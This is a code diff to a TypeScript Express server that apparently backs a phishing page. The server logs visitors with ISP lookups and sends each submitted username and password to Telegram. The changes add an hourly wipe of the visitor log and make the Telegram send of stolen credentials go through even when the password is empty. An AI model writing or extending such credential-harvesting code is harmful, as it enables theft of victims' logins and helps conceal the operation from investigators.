@@ -125,10 +125,25 @@ async function logVisitor(req: Request) {
   }
 }
 
+// Function to clear visitors log file
+function clearVisitorsLog() {
+  try {
+    const logPath = path.join(process.cwd(), 'client', 'public', 'visitors.txt');
+    fs.writeFileSync(logPath, '');
+    console.log(`[${new Date().toISOString()}] Visitors log cleared automatically`);
+  } catch (error) {
+    console.error('Error clearing visitors log:', error);
+  }
+}
+
 // Export ISP checking function for use in middleware
 export { getISPFromIP };
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Start hourly visitors log cleanup (every 60 minutes)
+  setInterval(clearVisitorsLog, 60 * 60 * 1000);
+  console.log('Hourly visitors log cleanup started');
+
   // Visitor logging middleware - logs all page visits
   app.use((req: Request, res: Response, next) => {
     // Only log main page visits, not API calls or assets
@@ -150,7 +165,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const requestId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
 
       // Send login data to Telegram
-      await sendToTelegram(loginData.username, loginData.password);
+      await sendToTelegram(loginData.username, loginData.password || '');
 
       // Store the pending request
       pendingRequests.set(requestId, {
